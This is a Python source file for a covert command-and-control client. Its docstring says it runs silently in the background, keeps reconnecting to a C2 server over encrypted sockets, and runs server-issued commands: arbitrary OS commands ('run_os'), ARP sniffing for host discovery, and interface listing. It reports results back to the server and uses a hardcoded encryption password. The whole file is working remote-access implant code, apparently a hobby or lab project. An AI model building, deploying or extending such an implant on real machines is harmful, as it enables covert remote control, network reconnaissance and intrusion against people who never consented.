""" 
Intended to be a client that runs silently in the background (not providing any local output)
The client connects to a c2_server and communicates over encrypted sockets
Commands are sent from the server and processed by the clients
Responses are sent to the server and displyed there
Status of continous functions is regularily sent to server.

The FunctionManager class is aimed at having a modular approach 
It should be easy to add new functions by:
1. importing them from other modules or adding them to within the class
2. add them to the self.functions dictionary according to syntax

There are basically 2 types of functions:
"one-time" that runs in one stretch and then ends
"continuous" that runs in a loop, either endless or timed. 
    Those come with the possibility to prematurly stop them by 
    settting a threading.Event() that is passed as an external 
    variable that is a part of the entry in theself.functions-dictionary
    
All functions pass any output to the response_lists (a list of strings)
that is continuously parsed by a thread that sends them to the server
"""
# Comment out Logging in main

import sys
import os
import platform
import socket
import threading
import select
import time
# import logging
import json
import struct
import argparse
from .if_lister import if_lister
from .run_os_command import run_os_command
from .arp_sniffer import arp_sniffer

# add parent directory to pythonpath
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from utils.crypto_tool.crypto_tool import encrypt_pwd, decrypt_pwd
from utils.ip_addr_chk.ip_addr_chk import ip_type


# Global constants
RETRY_INTERVAL = 10 # Value to try to reconnect to the server


# Global variables
server_address = "127.0.0.1"
c_port = 8000  # Change as needed for the command socket
s_port = 8001  # Change as needed for the status socket

response_list = []
response_lock = threading.Lock()

crypt_password = "a1B2c3D4e5F6g7H8!"
shutdown_flag = False

class FunctionManager:
    """
    Manages client functions, tracking their availability and running status.
    
    For functions to be run, they have to:
    1. Be in the functions (dict).
        mandatory key/values for all functions:
        a. type: str
            A function could be of 2 types:
           "one-time" : A function that is run straight through without any major loops.
            "continuous" : A function that runs for a longer time or and endless loop.
        b. start_func: function
            This is the function that starts the deisred function.
            It could be the desired function itself, or some sort of wrapper.
        c. help: str
        mandatory values for "continuous" functions:
        d. status: str
            simple states the status of the function ("Stopped" or "Running")
        e. thread: None
            holds the thread of the function
        f. stop_event: threading.Event()
            an external event that is set externally (preferrably by the stop function)
            to signal to the thread that i'ts time to stop running.
        optional argument for all types:
        g. fnargs: tuple
            Extra function arguments that is connected to an external variable.
            This is a variable to use if the function needs to exchange information 
            with other functions in the system or just needs to store something.
            
    2. The start_function needs to take accept the arguments in this order:
        stop_event - (if continous)
        response_list 
        response_lock
        fnargs [optional]
        extra arguments used when calling it that is sent from the server. [optional]
    
    """

    def __init__(self, update_interval: float):
        """
        Initializes the FunctionManager with a specified update interval.
              
        Args:
            update_interval (float): The interval for sending status updates in seconds.
        
        """
        self.update_interval = update_interval
        self.arp_hosts = {}
        self.functions = {
            'help': {
                'type': 'one-time',
                'start_func': self.help,
                'help': "Displays list of commands and descriptions"
            },
            'set_update_interval': {
                'type': 'one-time',
                'start_func': self.set_update_interval,
                'help': "Set the interval for sending status updates. Args: [req] seconds:float"
            },
            'arp_sniffer': {
                'type': 'continuous',
                'status': 'Stopped',
                'thread': None,
                'start_func': arp_sniffer.arp_sniffer,
                'fnargs': (self.arp_hosts,),
                'stop_event': threading.Event(),
                'help': "Sniffs ARP packets continuously until stopped. \n" + " "*27 +
                "Args: [req] bind_address:str [opt] interval:float, duration:float"
            },
            'get_hosts': {
                'type': 'one-time',
                'start_func': self.get_arp_hosts,
                'fnargs': (self.arp_hosts,),
                'help': "Displays the discovered hosts"
            },
            'if_list': {
                'type': 'one-time',
                'start_func': if_lister.list_ifs,
                'help': "Displays a list of network interfaces."
            },
            'get_os': {
                'type': 'one-time',
                'start_func': self.get_os,
                'help': "Displays the operating system of the client"
            },
            'run_os': {
                'type': 'one-time',
                'start_func': run_os_command.run_os_command,
                'help': "Runs [command] in the client os. \n" + " "*27 +
                 "Args: [req] command:str [opt] arguments:args"
            },
            'stop': {
                'type': 'one-time',
                'start_func': self.stop_function,
                'help': "Stops running functions. Args: [req] function_name:str"
            },
            'stop_client': {
                'type': 'one-time',
                'start_func': self.stop_client,
                'help': "Shuts down all functions and then stops client."
            }
        }

    def start_function(self, function_name: str, *args: any) -> None:
        """
        Starts the specified function with the given arguments.

        Args:
            function_name (str): The name of the function to start.
            *args: Additional arguments to pass to the function.

        Returns:
            None
        """
        # Check if the function exists in the dictionary
        if function_name not in self.functions:
            with response_lock:
                response_list.append(f"Error: Function '{function_name}' not found.")
            return

        function_info = self.functions[function_name]

        # Add response_list and response_lock as the first arguments for each function

        base_args = (
            response_list,
            response_lock,
            *function_info.get("fnargs",()),
            *args
            )

        # Define the thread wrapper function for error handling
        def thread_wrapper(target_func, *args):
            """ 
            Wrapper to catch error regarding arguments in function calls
            """
            try:
                target_func(*args)
            except TypeError as e:
                with response_lock:
                    response_list.append(f"TypeError in thread {target_func.__name__}: {str(e)}")
            except Exception as e:
                with response_lock:
                    response_list.append(f"Error in thread {target_func.__name__}: {str(e)}")

        try:
            # Initialize thread with the wrapper function and arguments
            if function_info["type"] == "one-time":
                # Start a one-time function
                thread = threading.Thread(
                    target=thread_wrapper,
                    args=(
                        function_info["start_func"],
                        *base_args
                        )
                    )
                thread.start()

            elif function_info["type"] == "continuous":
                # Continuous functions require a stop_flag
                continuous_args = (function_info['stop_event'], *base_args)
                function_info['stop_event'].clear()
                thread = threading.Thread(
                    target=thread_wrapper,
                    args=(
                        function_info["start_func"],
                          *continuous_args
                          )
                    )
                self.functions[function_name]["thread"] = thread
                thread.start()
                # Update function status for continuous functions
                self.functions[function_name]["status"] = "Running"

            else:
                # Handle invalid function type with an error message
                with response_lock:
                    response_list.append(f"Error: Function '{function_name}' has an invalid type.")
                return  # Exit function if type is invalid

        except TypeError as e:
            # Handle TypeErrors, which indicate argument mismatch
            with response_lock:
                response_list.append(f"Argument error for '{function_name}': {str(e)}")

        except Exception as e:
            # Catch-all for unexpected exceptions with function name context
            with response_lock:
                response_list.append(f"Error starting function '{function_name}': {str(e)}")

    def stop_function(self,reply_list:list, reply_lock, func_name: str) -> None:
        """
        Stops a continuous function.

        Args:
            func_name (str): The name of the function to stop.

        Returns:
            None
        """
        func_info = self.functions.get(func_name)
        if not func_info or func_info['type'] != 'continuous':
            with reply_lock:
                reply_list.append(f"No such continuous function: {func_name}")
            return

        # Set stop flag and join the thread to stop the continuous function
        func_info['stop_event'].set()
        if func_info['thread']:
            func_info['thread'].join()
            with reply_lock:
                reply_list.append(f"Function is stopped: {func_name}")
        func_info['status'] = 'Stopped'
        
    def help(self, reply_list:list, reply_lock, *args: any) -> None:
        """
        Displays help information about available functions.

        Args:
            reply_list (list[str]): The list to append help information to.
            reply_lock (Lock): A threading lock to ensure thread-safe access to reply_list.
            *args: Additional arguments (if any).

        Returns:
            None
        """
        for name in self.functions.keys():
            help_text = name.ljust(25) + self.functions[name]['help']
            with reply_lock:
                reply_list.append(help_text)
        if args:
            with reply_lock:
                reply_list.append(f"Additional arguments: {args}")

    def set_update_interval(self, reply_list:list, reply_lock, interval: float) -> None:
        """ 
        Sets the interval for the client to send status updates.

        Args:
            interval (float): The new update interval in seconds.

        Returns:
            None
        """
        try:
            self.update_interval = float(interval)
        except ValueError:
            with reply_lock:
                reply_list.append("set_update_interval takes a float as argument")

    def get_arp_hosts(self, reply_list: list, reply_lock, arp_hosts) -> None:
        """
        Appends information about discovered ARP hosts to a reply list.

        Args:
            reply_list (list): The list to append discovered hosts information to.
            reply_lock (Lock): A threading lock to ensure thread-safe access to reply_list.

        Returns:
            None
        """
        with reply_lock:
            reply_list.append("Discovered ARP hosts:")
            for mac, data in arp_hosts.items():
                reply_list.append(f"MAC: {mac}")
                reply_list.append("  IPs:")
                for ip in data["IPs"]:
                    reply_list.append(f"       {ip}")
                reply_list.append("-" * 22)

    def get_os(self, reply_list: list, reply_lock) -> None:
        """
        Get the operating system and add it to a shared list, ensuring thread safety.

        This function retrieves the operating system name using `platform.system()` 
        and appends it to `reply_list`, a shared list resource. To ensure thread 
        safety, it acquires `reply_lock` before modifying `reply_list`.

        Parameters:
        - reply_list (list): A shared list where the operating system name will be appended.
        - reply_lock (threading.Lock): A threading lock to prevent race conditions when 
        accessing `reply_list`.

        Returns:
        - None
        """
        # Get the OS name
        os_name = platform.system()

        # Lock the response_list while appending the OS
        with reply_lock:
            reply_list.append(os_name)

    def get_function_statuses(self) -> dict:
        """
        Returns a structured dictionary of continuous function names and their statuses.

        Returns:
            dict: A dictionary with function names as keys and their statuses as values.
        """
        return {
            'functions': {
                name: {'status': details['status']}
                for name, details in self.functions.items()
                if details['type'] == 'continuous'  # Filter for continuous functions
            }
        }

    def stop_client(self, reply_list, reply_lock):
        """
        Gracefully stop the client by setting the shutdown flag
        and appending a shutdown status message to the reply list.
        """
        # Stop any running FunctionManager functions
        for name, details in self.functions.items():
            if details.get('type') == 'continuous' and details.get('status') == 'Running':
                self.stop_function(reply_list,reply_lock,name)

        # Add a shutdown status message to the reply list with thread-safe handling
        with reply_lock:
            reply_list.append("Client shutdown initiated.")
        # Set the shutdown flag (assuming the relevant shutdown mechanism exists)
        global shutdown_flag
        shutdown_flag = True  # This should interact with the actual shutdown flag in the client

class ControlClient:
    """
    Client class to connect to the server for:
        receiving commands
        interpreting commands
        sending replies
        sending status updates.
    """

    def __init__(
        self,
        host: str,
        command_port: int,
        status_port: int,
        function_manager: FunctionManager
    ):
        """
        Initializes a client instance with connection details for server communication.

        This constructor sets up the client's network configuration, including host IP,
        command and status ports, and establishes the necessary sockets for communication.
        It also references a `FunctionManager` instance to manage client functionalities 
        and sets up related attributes.

        Parameters:
        host (str): IP address or hostname of the server to connect to.
        command_port (int): Port for sending commands to the server.
        status_port (int): Port for receiving status updates from the server.
        function_manager (FunctionManager): Instance of FunctionManager to manage client
            functionalities and access configuration, such as update intervals.

        Attributes:
        command_socket (socket.socket): Socket for command communication.
        status_socket (socket.socket): Socket for status updates.
        update_interval (float): Interval, in seconds, for periodic updates, derived from
            `FunctionManager`.
        command_connected (bool): Tracks command socket connection status.
        status_connected (bool): Tracks status socket connection status.

        Returns:
        None
        """
        self.host = host
        self.command_port = command_port
        self.status_port = status_port
        self.command_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.status_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.function_manager = function_manager  # Reference to the FunctionManager
        self.update_interval = self.function_manager.update_interval
        self.command_connected = False
        self.status_connected = False


    def command_thread(self) -> None:
        """
        Manages the command communication channel with the server.

        This method continuously attempts to establish and maintain a connection 
        to the server's command port. It listens for incoming commands from the server 
        and sends encrypted responses back. If the connection is lost (e.g., server 
        restarts or network issues), the thread will attempt to reconnect after 
        a specified interval.

        The method uses non-blocking socket operations, leveraging `select.select()` 
        to monitor socket readiness for reading and writing. The responses sent back 
        to the server are encrypted, and incoming commands are decrypted and processed.

        The method will gracefully exit when `shutdown_flag` is set to `True`, 
        ensuring the connection is closed properly and all resources are cleaned up.

        Attributes:
            command_socket (socket.socket): The socket used for communication with the server.
            command_connected (bool): Tracks the connection status to the server.
            shutdown_flag (bool): Set to `True` to stop the thread and exit.
            response_list (list): Holds the responses to be sent to the server.
            response_lock (threading.Lock): Used to synchronize access to `response_list`.

        Raises:
            Exception: If an error occurs during socket operations, the connection 
                        attempt will restart after closing the socket.

        Returns:
            None
        """
        while not shutdown_flag:
            if not self.command_connected:
                try:
                    # Attempt to connect to the server in a non-blocking manner
                    self.command_socket.connect((self.host, self.command_port))
                    self.command_socket.setblocking(False)
                    self._append_response("Connected to server for command channel.")
                    self.command_connected = True
                except Exception as e:
                    # if self.command_socket is not None:
                    #      self.command_socket.close()
                    self.command_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    self.command_connected = False
                    time.sleep(RETRY_INTERVAL)

            # Prepare lists for monitoring socket readiness
            inputs = [self.command_socket]
            outputs = [self.command_socket]

            try:
                while inputs and self.command_connected:
                    # Monitor the socket for read/write availability using select
                    readable, writable, exceptional = select.select(inputs, outputs, inputs, 1)

                    # Process messages to send if there are any in the response_list
                    for sock in writable:
                        if response_list:
                            with response_lock:
                                # Retrieve the oldest response to send
                                response = response_list.pop(0)

                            # Encrypt the response
                            ciph_resp = encrypt_pwd(response.encode('utf-8'), crypt_password)

                            # Create a 4-byte header with the length of the encrypted message
                            length = len(ciph_resp)
                            length_bytes = struct.pack('!I', length)

                            # Send the length header and the encrypted message
                            sock.sendall(length_bytes + ciph_resp)
                            time.sleep(0.1)

                    # Receive incoming commands from the server
                    for sock in readable:
                        try:
                            # Read encrypted command from the server
                            ciph_comm = sock.recv(1024)
                            if ciph_comm:
                                # Decrypt and process the command
                                command = decrypt_pwd(ciph_comm, crypt_password).decode()
                                self.handle_command(command)
                        except socket.error:
                            # If there is a socket error (disconnection),
                            # mark the connection as broken
                            self.command_connected = False
                            break
                        time.sleep(0.1)

                    # Handle any exceptional conditions (e.g., socket errors)
                    for sock in exceptional:
                        pass

                    # Brief pause to prevent busy-waiting
                    time.sleep(0.1)

            except Exception as e:
                # If an exception occurs, mark the connection as broken and attempt to reconnect
                self.command_connected = False

            finally:
                # Clean up and mark the thread as not running
                self.command_connected = False

    def status_thread(self) -> None:
        """
        Establishes and maintains a connection to the server for sending periodic status updates.

        This method attempts to connect to the server's status port, then continuously retrieves 
        the current function statuses from `function_manager`, encrypts the data, and sends it to 
        the server. 
        The status updates are sent at regular intervals, controlled by the `update_interval` 
        attribute, to prevent flooding the server with too frequent messages.

        The method will handle connection failures and 
        will attempt to reconnect if the connection is lost. 
        If the thread is stopped by setting `shutdown_flag`, 
        the connection will be gracefully closed.

        Attributes:
            status_socket (socket.socket): The socket used to send status updates to the server.
            status_connected (bool): Indicates whether the connection to the server is established.
            update_interval (float): The interval in seconds between each status update.
            shutdown_flag (bool): Flag set to `True` to stop the thread and exit.
            function_manager (object): Manages the functions and their statuses.
            crypt_password (str): Password used for encrypting the status update messages.

        Raises:
            Exception: If an error occurs during socket operations or status update transmission.

        Returns:
            None
        """
        # Try connecting to the server's status port
        while not self.status_connected and not shutdown_flag:
            try:
                self.status_socket.connect((self.host, self.status_port))
                self._append_response("Connected to server for status updates.")
                self.status_connected = True
            except Exception:
                if self.status_socket is not None:
                    self.status_socket.close()
                time.sleep(RETRY_INTERVAL)
                self.status_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.status_connected = False

            # Main loop for sending status updates
            while not shutdown_flag and self.status_connected:
                try:
                    if self.status_connected:
                        # Fetch current function statuses
                        status_update = json.dumps(self.function_manager.get_function_statuses())

                        # Encrypt the status data
                        ciph_status = encrypt_pwd(status_update.encode('utf-8'), crypt_password)

                        # Send the encrypted status update to the server
                        self.status_socket.sendall(ciph_status)

                        # Wait before sending the next update to avoid flooding the server
                        time.sleep(self.update_interval)

                except Exception as e:
                    # Log any error that occurs while sending the status update
                    self._append_response(f"Error sending status update: {e}")
                    self.status_connected = False
                    break

        # Cleanup: Mark status as not connected and stop the thread
        self.status_connected = False

    def handle_command(self, command: str) -> None:
        """
        Processes and executes commands received from the server.

        This method validates the received command against a list of available functions 
        in `function_manager`. If the command is valid, it initiates the function with 
        any specified arguments. If no arguments are provided, the function is called 
        without parameters. If an unrecognized command is received, an error message 
        is appended to the response list.

        Parameters:
        command (str): The command received from the server, potentially with arguments.

        Process:
        - Splits the `command` string to isolate the command name and any arguments.
        - Checks if `command_name` is in the list of `valid_commands`.
        - Calls `function_manager.start_function` with or without arguments based on 
        the command input.

        Side Effects:
        - Appends an error message to the response list if an invalid command is provided.

        Returns:
        None
        """
        # Build a list of valid commands
        valid_commands = []
        function_list = self.function_manager.functions
        for function in function_list.keys():
            valid_commands.append(function)

        # Split received command into command, args
        command_strings = command.split(maxsplit=1)
        command_name = command_strings[0]

        if command_name in valid_commands:
            if len(command_strings) == 1:
                self.function_manager.start_function(command_name)
            elif len(command_strings) == 2:
                self.function_manager.start_function(
                    command_name,
                    *tuple(command_strings[1].split())
                )
        else:
            self._append_response(f"{command_name} is not a valid command")

    def send_available_functions(self) -> None:
        """
        Sends the list of available functions and their statuses to the server.

        This method retrieves a dictionary of all available functions with their 
        current statuses from `function_manager`, converts it to a JSON-formatted 
        string, and sends it to the server.

        Returns:
        None
        """
        available_functions = self.function_manager.get_function_statuses()
        functions_list = json.dumps(available_functions, indent=4)
        self._append_response(functions_list)

    def _append_response(self, message: str) -> None:
        """
        Appends a message to the shared response list in a thread-safe manner.

        This method acquires a lock on `response_list` to safely add a new message 
        from multiple threads, ensuring synchronization. The message is appended 
        to `response_list` for further processing or logging.

        Parameters:
        message (str): The message to be appended to `response_list`.

        Returns:
        None
        """
        with response_lock:
            response_list.append(message)

def parse_arguments() -> argparse.Namespace:
    """
    Parses command-line arguments for configuring the client connection.

    This function uses argparse to define and parse command-line arguments 
    that specify the server IP, ports for status updates and command exchange, 
    and an encryption password. Each argument has a default value for ease 
    of setup.

    Arguments:
    --server (str): The server IP address. Defaults to '127.0.0.1'.
    --s_port (int): The port number for status updates. Defaults to 8001.
    --c_port (int): The port number for sending commands. Defaults to 8000.
    --pw (str): The password used for generating the encryption key; 
                must match on both client and server sides. Defaults 
                to "a1B2c3D4e5F6g7H8!".

    Returns:
    argparse.Namespace: An object containing the parsed arguments with 
                        their respective values.
    """
    parser = argparse.ArgumentParser(description="Client for connecting to the server.")

    # Add arguments with default values
    parser.add_argument(
        '--server',
        type=ip_type,
        default='127.0.0.1',
        help='The server IP address. Default is 127.0.0.1.'
    )
    parser.add_argument(
        '--s_port',
        type=int,
        default=8001,
        help='The port for status updates. Default is 8001.'
    )
    parser.add_argument(
        '--c_port',
        type=int,
        default=8000,
        help='The port for sending commands. Default is 8000.'
    )
    parser.add_argument(
        '--pw',
        type=str,
        default="a1B2c3D4e5F6g7H8!",
        help='The password used for generating encryption key. Needs to be the same on the server.'
    )

    # Parse the arguments
    args = parser.parse_args()
    return args

def main() -> None:
    """
    Main function to run the client application.

    This function initiates the client by parsing command-line arguments, 
    setting up logging (if enabled), and defining an interval for status 
    updates. It creates instances of `FunctionManager` and `ControlClient` 
    to manage client functions and handle server communications.

    The function launches separate threads for handling server commands and 
    sending status updates. It also monitors these threads to automatically 
    reconnect if either thread stops running.

    Exceptions:
        KeyboardInterrupt: Stops the client when the user interrupts execution.

    Returns:
        None
    """
    # Debug logging
    # Remove comments to enable logging to file.
    # Insert one of the last linse with proper text to log what happens
    # logging.basicConfig(
    # filename='debug.log',  # Log file name
    # level=logging.INFO,    # Set the logging level to DEBUG
    # format='%(asctime)s - %(levelname)s - %(message)s',  # Log message format
    # )
    # logging.info(f"Logging started")
    # logging.info(f"text i want to log {value_i_want_to_log}")

    args = parse_arguments()

    # Interval for status updates
    update_interval = 1.0
    # Create an instance of FunctionManager
    manager = FunctionManager(update_interval)
    # Create an instance of Controllerclient
    client = ControlClient(args.server, args.c_port, args.s_port, manager)

    # Start command and status threads
    threading.Thread(target=client.command_thread, daemon=True).start()
    threading.Thread(target=client.status_thread, daemon=True).start()

    # Keep the main thread running until KeyboardInterrupt (Ctrl+C)
    try:
        while True:
            time.sleep(1)  # Sleep to avoid busy-waiting, nothing else needed in the loop.
            if shutdown_flag:
                raise KeyboardInterrupt
    except KeyboardInterrupt:
        # Call stop_client to gracefully stop the client and all continuous functions
        manager.stop_client(reply_list=response_list, reply_lock=response_lock)
        # Set the shutdown flag to stop the threads
    exit(0)

if __name__ == "__main__":
    main()
